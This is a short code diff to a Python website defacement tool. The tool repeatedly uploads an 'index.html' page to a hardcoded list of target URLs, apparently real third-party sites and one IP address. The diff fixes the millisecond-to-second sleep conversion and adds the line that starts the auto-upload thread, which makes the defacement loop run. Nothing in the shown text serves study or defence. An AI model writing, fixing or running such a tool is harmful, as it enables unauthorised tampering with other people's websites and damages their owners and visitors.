@@ -133,7 +133,7 @@ def auto_upload_deface(script, links, interval_ms):
     while True:
         for link in links:
             auto_upload(script, link)
-            time.sleep(interval_ms / 1)  # Convert interval to seconds
+            time.sleep(interval_ms / 1000)  # Convert interval to seconds
 
 def auto_upload(script, target_url):
     try:
@@ -179,4 +179,5 @@ if __name__ == "__main__":
     banner = banner.replace("[⍟]", "[AUTO]")
     links = ["http://georgian.za.net", "http://nhsgilde.co.za", "http://83.211.190.83", "http://n8tive.co.za"]  # List of links to upload to
     auto_upload_thread = threading.Thread(target=auto_upload_deface, args=("index.html", links, 1))  # Auto upload every 1 ms
+    auto_upload_thread.start()
     main(banner)
